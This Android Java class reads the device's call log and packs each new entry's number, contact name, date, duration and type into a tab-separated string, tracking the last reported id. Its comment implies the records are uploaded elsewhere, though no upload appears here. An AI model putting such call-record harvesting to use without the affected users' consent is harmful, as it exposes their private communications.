package com.rdcx.loction;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.provider.CallLog;

public class CallsInfoCollector {
	public int currentCount = 0;
	public String result = null;
	public int new_last_id = 0;
	public void Process(Context c) {
		StringBuilder sb = new StringBuilder();
		SharedPreferences singles = c.getSharedPreferences("singles", Context.MODE_PRIVATE);
		// 上一次成功上报的�?��id
		int last_id = singles.getInt("last_call_id", 0);
		Cursor cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "_id desc");
		if(cur == null) {
			result = "";
			return;
		}
		if(cur.moveToFirst()) {
			int count = cur.getCount();
			int _id;
			String number;
			String name;
			long date, duration;
			int type;
			new_last_id = 0;
			while(cur.getPosition() != count) {
				_id = cur.getInt(cur.getColumnIndex("_id"));
				if(last_id != 0 && last_id >= _id) {
					break;
				}
				if(new_last_id == 0) {
					new_last_id = _id;
				}
				currentCount++;
				
				sb.append(_id);
				sb.append('\t');
				number = cur.getString(cur.getColumnIndex("number"));
				sb.append(textProcess(number));
				sb.append('\t');
				date = cur.getLong(cur.getColumnIndex("date"));
				sb.append(date);
				sb.append('\t');
				duration = cur.getLong(cur.getColumnIndex("duration"));
				sb.append(duration);
				sb.append('\t');
				type = cur.getInt(cur.getColumnIndex("type"));
				sb.append(type);
				sb.append('\t');
				name = cur.getString(cur.getColumnIndex("name"));
				sb.append(textProcess(name));
				sb.append('\n');
				
				cur.moveToNext();
			}
		}
		cur.close();
		result = sb.toString();
	}
	
	public void SetLastId(Context c) {
		if(new_last_id != 0) {
			SharedPreferences singles = c.getSharedPreferences("singles", Context.MODE_PRIVATE);
			SharedPreferences.Editor editor = singles.edit();
			editor.putInt("last_call_id", new_last_id);
			editor.apply();
		}
	}
	
	private static String textProcess(String s) {
		if(s == null) return "";
		return s.replace('\t', ' ').replace('\n', ' ');
	}
}
